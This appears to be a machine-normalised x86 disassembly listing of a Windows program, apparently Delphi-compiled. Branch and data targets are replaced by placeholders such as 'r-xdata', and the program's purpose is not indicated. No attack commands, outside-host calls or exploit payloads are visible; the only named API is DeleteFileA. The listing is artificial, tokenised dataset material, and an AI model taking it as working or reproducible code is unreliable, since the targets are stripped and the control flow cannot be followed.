lea ecx [ ebp - 0x1a4 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1a4 ]
lea edx [ ebp - 0x1a0 ]
call sub_4093d8
cmp [ ebp - 0x1a0 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
jmp [ eax * 4 + jump_table_49ff86 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x28 ] eax
lea edx [ ebp - 0x1bc ]
mov eax [ ebp - 0x14 ]
call sub_4093d8
mov eax [ ebp - 0x1bc ]
lea edx [ ebp - 0x1b8 ]
call sub_49fba8
mov edx [ ebp - 0x1b8 ]
lea eax [ ebp - 0x1b4 ]
call sub_4050e8
mov edx [ ebp - 0x1b4 ]
mov eax [ ebp - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc ebx
mov [ ebp - 0x3c ] ebx
inc [ ebp - 0x34 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x1ac ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1ac ]
lea edx [ ebp - 0x1a8 ]
call sub_4093d8
mov edx [ ebp - 0x1a8 ]
lea eax [ ebp - 0x14 ]
call sub_40512c
jmp r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d4f8
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x364 ] ebx
mov [ ebx + 0xf ] 0x1
mov eax ebx
call sub_41d988
jmp r-xdata
lea eax [ ebp - 0x1d4 ]
call sub_45e31c
mov edx [ ebp - 0x1d4 ]
mov eax [ rw-data ]
call sub_4057bc
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d4f8
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x368 ] ebx
mov [ ebx + 0xf ] 0x1
mov eax ebx
call sub_41d988
jmp r-xdata
mov eax [ rw-data ]
call sub_40566c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
lea eax [ ebp - 0x10 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov eax [ rw-data ]
call sub_40566c
lea ecx [ ebp - 0x218 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x218 ]
mov eax r-xdata
call sub_405468
mov ebx eax
lea ecx [ ebp - 0x21c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x21c ]
mov eax r-xdata
call sub_405468
mov esi eax
lea eax [ ebp - 0x18 ]
call sub_404e44
cmp ebx 0x1
jle r-xdata
mov eax [ rw-data ]
call sub_40566c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov eax [ rw-data ]
call sub_40566c
lea ecx [ ebp - 0x254 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x254 ]
mov eax r-xdata
call sub_405468
mov ebx eax
lea ecx [ ebp - 0x258 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x258 ]
mov eax r-xdata
call sub_405468
mov esi eax
lea eax [ ebp - 0x18 ]
call sub_404e44
cmp ebx 0x1
jle r-xdata
lea eax [ ebp - 0x10 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov esi 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov esi 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
lea eax [ ebp - 0x10 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
lea ecx [ ebp - 0x364 ]
mov edx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x364 ]
lea edx [ ebp - 0x360 ]
call sub_4093d8
mov eax [ ebp - 0x360 ]
call sub_49f204
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_4a157a
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov ebx eax
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_420e5c
mov [ ebx + 0xc ] 0x0
lea ecx [ ebp - 0x36c ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x36c ]
lea edx [ ebp - 0x368 ]
call sub_4093d8
mov edx [ ebp - 0x368 ]
xor ecx ecx
mov eax ebx
call sub_420ec4
lea ecx [ ebp - 0x374 ]
mov edx 0x4
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x374 ]
lea edx [ ebp - 0x370 ]
call sub_4093d8
mov eax [ ebp - 0x370 ]
push eax
lea ecx [ ebp - 0x37c ]
mov edx 0x3
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x37c ]
lea edx [ ebp - 0x378 ]
call sub_4093d8
mov edx [ ebp - 0x378 ]
mov eax ebx
pop ecx
call sub_4215d0
mov eax ebx
call sub_420e2c
mov eax ebx
call sub_403f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea ecx [ ebp - 0x3a0 ]
mov edx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x3a0 ]
lea edx [ ebp - 0x39c ]
call sub_4093d8
mov eax [ ebp - 0x39c ]
call sub_49f204
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x10 ]
call sub_404e44
xor eax eax
push ebp
push j_sub_404444#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov ebx eax
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_420e5c
mov [ ebx + 0xc ] 0x0
lea ecx [ ebp - 0x3a8 ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x3a8 ]
lea edx [ ebp - 0x3a4 ]
call sub_4093d8
mov edx [ ebp - 0x3a4 ]
xor ecx ecx
mov eax ebx
call sub_420ec4
lea ecx [ ebp - 0x3b0 ]
mov edx 0x3
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x3b0 ]
lea edx [ ebp - 0x3ac ]
call sub_4093d8
mov edx [ ebp - 0x3ac ]
lea ecx [ ebp - 0x10 ]
mov eax ebx
call sub_421600
mov eax ebx
call sub_420e2c
mov eax ebx
call sub_403f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea ecx [ ebp - 0x3c4 ]
mov edx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x3c4 ]
lea edx [ ebp - 0x3c0 ]
call sub_4093d8
mov eax [ ebp - 0x3c0 ]
call sub_49f204
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x10 ]
call sub_404e44
xor eax eax
push ebp
push j_sub_404444#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov ebx eax
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_420e5c
mov [ ebx + 0xc ] 0x0
lea ecx [ ebp - 0x3cc ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x3cc ]
lea edx [ ebp - 0x3c8 ]
call sub_4093d8
mov edx [ ebp - 0x3c8 ]
xor ecx ecx
mov eax ebx
call sub_420ec4
lea ecx [ ebp - 0x3d4 ]
mov edx 0x3
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x3d4 ]
lea edx [ ebp - 0x3d0 ]
call sub_4093d8
mov edx [ ebp - 0x3d0 ]
mov eax ebx
call sub_421318
mov eax ebx
call sub_420e2c
mov eax ebx
call sub_403f64
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea ecx [ ebp - 0x3e8 ]
mov edx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x3e8 ]
lea edx [ ebp - 0x3e4 ]
call sub_4093d8
mov eax [ ebp - 0x3e4 ]
call sub_49f204
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x10 ]
call sub_404e44
xor eax eax
push ebp
push sub_4a1dcc
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x28 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov ebx eax
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_420e5c
mov [ ebx + 0xc ] 0x0
lea ecx [ ebp - 0x3ec ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x3ec ]
lea edx [ ebp - 0x1c ]
call sub_4093d8
lea ecx [ ebp - 0x3f4 ]
mov edx 0x1
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x3f4 ]
lea edx [ ebp - 0x3f0 ]
call sub_4093d8
mov edx [ ebp - 0x3f0 ]
lea eax [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405170
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x3fc ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x3fc ]
lea edx [ ebp - 0x3f8 ]
call sub_4093d8
push [ ebp - 0x3f8 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4051e4
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40512c
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_4051e4
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40512c
xor ecx ecx
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_420ec4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4213a0
mov eax ebx
call sub_420e2c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea ecx [ ebp - 0x440 ]
mov edx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x440 ]
lea edx [ ebp - 0x43c ]
call sub_4093d8
mov eax [ ebp - 0x43c ]
call sub_49f204
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x10 ]
call sub_404e44
xor eax eax
push ebp
push sub_4a1fb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov ebx eax
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_420e5c
lea ecx [ ebp - 0x448 ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x448 ]
lea edx [ ebp - 0x444 ]
call sub_4093d8
mov edx [ ebp - 0x444 ]
mov eax ebx
call sub_4211a0
mov eax ebx
call sub_420e2c
mov eax ebx
call sub_403f64
lea ecx [ ebp - 0x450 ]
mov edx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x450 ]
lea edx [ ebp - 0x44c ]
call sub_4093d8
mov edx [ ebp - 0x44c ]
lea eax [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405170
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x458 ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x458 ]
lea edx [ ebp - 0x454 ]
call sub_4093d8
push [ ebp - 0x454 ]
lea edx [ ebp - 0x45c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x45c ]
push r-xdata
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x10 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
lea eax [ ebp - 0x10 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
lea eax [ ebp - 0x10 ]
call sub_404e44
mov edi 0x2
xor ebx ebx
or ebx 0x0
or ebx 0x1
or ebx 0x2
xor esi esi
or esi 0x1
or esi 0x2
lea edx [ ebp - 0x4b8 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x4b8 ]
lea eax [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405170
push ebp
push 0x0
mov ecx esi
mov edx ebx
mov eax edi
call sub_49fb70
pop ecx
push r-xdata
lea ecx [ ebp - 0x4c4 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x4c4 ]
push r-xdata
lea eax [ ebp - 0x4c0 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x4c0 ]
lea edx [ ebp - 0x4bc ]
call sub_45dfa8
mov edx [ ebp - 0x4bc ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
lea eax [ ebp - 0x10 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x380 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
lea eax [ ebp - 0x10 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x560 ]
mov edx [ rw-data ]
mov edx [ edx + 0x3c4 ]
call sub_4057bc
push [ ebp - 0x560 ]
lea edx [ ebp - 0x568 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x568 ]
lea eax [ ebp - 0x564 ]
call sub_4057bc
push [ ebp - 0x564 ]
lea eax [ ebp - 0x55c ]
mov edx 0x3
call sub_405858
mov edx [ ebp - 0x55c ]
mov eax [ rw-data ]
add eax 0x39c
call sub_4050e8
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
push ebp
push j_sub_404444#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ rw-data ]
mov [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x570 ]
mov edx [ rw-data ]
mov edx [ edx + 0x3c4 ]
call sub_4057bc
push [ ebp - 0x570 ]
lea edx [ ebp - 0x578 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x578 ]
lea eax [ ebp - 0x574 ]
call sub_4057bc
push [ ebp - 0x574 ]
lea eax [ ebp - 0x56c ]
mov edx 0x3
call sub_405858
mov edx [ ebp - 0x56c ]
mov eax [ rw-data ]
add eax 0x39c
call sub_4050e8
xor edx edx
push ebp
push j_sub_404444#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_409df4
test al al
je r-xdata
lea edx [ ebp - 0x580 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458fd4
mov eax [ ebp - 0x580 ]
call sub_49e60c
call sub_404c9c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x388 ] edx
jmp r-xdata
lea eax [ ebp - 0x10 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jle r-xdata
mov eax [ ebp - 0x28 ]
call sub_403f64
jmp r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x0
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
dec [ ebp - 0x3c ]
jne r-xdata
lea ecx [ ebp - 0x198 ]
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x198 ]
lea edx [ ebp - 0x194 ]
call sub_4093d8
mov eax [ ebp - 0x194 ]
push eax
lea edx [ ebp - 0x19c ]
mov eax r-xdata
call sub_45ec84
mov eax [ ebp - 0x19c ]
pop edx
call sub_405468
test eax eax
jg r-xdata
lea edx [ ebp - 0x1ec ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40942c
mov eax [ ebp - 0x1ec ]
call sub_4057dc
cmp eax 0x2
jge r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
push r-xdata
lea ecx [ ebp - 0x214 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x214 ]
push r-xdata
lea eax [ ebp - 0x210 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x210 ]
lea edx [ ebp - 0x20c ]
call sub_45dfa8
mov edx [ ebp - 0x20c ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
xor eax eax
push ebp
push sub_4a041b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
call sub_4099e8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp esi 0x1
jle r-xdata
mov eax [ rw-data ]
mov [ eax ] 0xffffffff
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d4f8
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x36c ] ebx
mov [ ebx + 0xf ] 0x1
mov eax ebx
call sub_41d988
jmp r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp esi 0x1
jle r-xdata
push r-xdata
lea ecx [ ebp - 0x298 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x298 ]
push r-xdata
lea eax [ ebp - 0x294 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x294 ]
lea edx [ ebp - 0x290 ]
call sub_45dfa8
mov edx [ ebp - 0x290 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
lea eax [ ebp - 0x10 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
sub eax esi
jl r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
xor eax eax
push ebp
push j_sub_404444#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_409df4
test al al
je r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
lea eax [ ebp - 0x10 ]
call sub_404e44
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
sub eax esi
jl r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
push r-xdata
lea ecx [ ebp - 0x35c ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x35c ]
push r-xdata
lea eax [ ebp - 0x358 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x358 ]
lea edx [ ebp - 0x354 ]
call sub_45dfa8
mov edx [ ebp - 0x354 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
lea eax [ ebp - 0x10 ]
call sub_404e44
xor eax eax
push ebp
push sub_4a1635
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov ebx eax
mov edx [ ebp - 0x24 ]
mov eax ebx
call sub_420e5c
mov [ ebx + 0xc ] 0x0
lea ecx [ ebp - 0x384 ]
mov edx 0x2
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x384 ]
lea edx [ ebp - 0x380 ]
call sub_4093d8
mov edx [ ebp - 0x380 ]
xor ecx ecx
mov eax ebx
call sub_420ec4
lea ecx [ ebp - 0x38c ]
mov edx 0x3
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x38c ]
lea edx [ ebp - 0x388 ]
call sub_4093d8
mov edx [ ebp - 0x388 ]
lea ecx [ ebp - 0x10 ]
mov eax ebx
call sub_421600
mov eax ebx
call sub_420e2c
mov eax ebx
call sub_403f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov eax ebx
call sub_403f64
mov eax [ ebp - 0x28 ]
call sub_403f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x0
push r-xdata
lea ecx [ ebp - 0x468 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x468 ]
push r-xdata
lea eax [ ebp - 0x464 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x464 ]
lea edx [ ebp - 0x460 ]
call sub_45dfa8
mov edx [ ebp - 0x460 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
push r-xdata
lea ecx [ ebp - 0x484 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x484 ]
push r-xdata
lea eax [ ebp - 0x480 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x480 ]
lea edx [ ebp - 0x47c ]
call sub_45dfa8
mov edx [ ebp - 0x47c ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x49c ]
mov edx [ rw-data ]
mov edx [ edx + 0x3c4 ]
call sub_4057bc
push [ ebp - 0x49c ]
lea edx [ ebp - 0x4a4 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x4a4 ]
lea eax [ ebp - 0x4a0 ]
call sub_4057bc
push [ ebp - 0x4a0 ]
lea eax [ ebp - 0x498 ]
mov edx 0x3
call sub_405858
mov edx [ ebp - 0x498 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_4050e8
lea ecx [ ebp - 0x4a8 ]
mov edx [ rw-data ]
mov edx [ edx + 0x10 ]
mov eax [ ebp - 0x10 ]
call sub_45ed54
mov edx [ ebp - 0x4a8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_409df4
test al al
je r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
lea edx [ ebp - 0x524 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x524 ]
mov eax [ rw-data ]
add eax 0x398
call sub_404e98
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x384 ] edx
xor eax eax
push ebp
push sub_4a28d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_409df4
test al al
je r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
push r-xdata
lea ecx [ ebp - 0x558 ]
mov eax [ rw-data ]
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push [ ebp - 0x558 ]
push r-xdata
lea eax [ ebp - 0x554 ]
mov edx 0x3
call sub_4051e4
mov eax [ ebp - 0x554 ]
lea edx [ ebp - 0x550 ]
call sub_45dfa8
mov edx [ ebp - 0x550 ]
mov eax [ rw-data ]
add eax 0x39c
call sub_404e98
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x10 ]
call sub_45e5e0
jmp r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ebx [ eax + 0x39c ]
mov [ ebp - 0x57c ] ebx
mov eax [ ebp - 0x57c ]
call sub_405324
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_49f7b0
mov ebx eax
test bl bl
je r-xdata
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x5c0 ]
mov edx [ rw-data ]
mov edx [ edx + 0x3c4 ]
call sub_4057bc
push [ ebp - 0x5c0 ]
lea edx [ ebp - 0x5c8 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x5c8 ]
lea eax [ ebp - 0x5c4 ]
call sub_4057bc
push [ ebp - 0x5c4 ]
lea eax [ ebp - 0x5bc ]
mov edx 0x3
call sub_405858
mov edx [ ebp - 0x5bc ]
mov eax [ rw-data ]
add eax 0x39c
call sub_4050e8
lea ecx [ ebp - 0x5cc ]
mov edx [ rw-data ]
mov edx [ edx + 0x10 ]
mov eax [ ebp - 0x10 ]
call sub_45ed54
mov edx [ ebp - 0x5cc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ rw-data ]
mov edx [ eax + 0x39c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
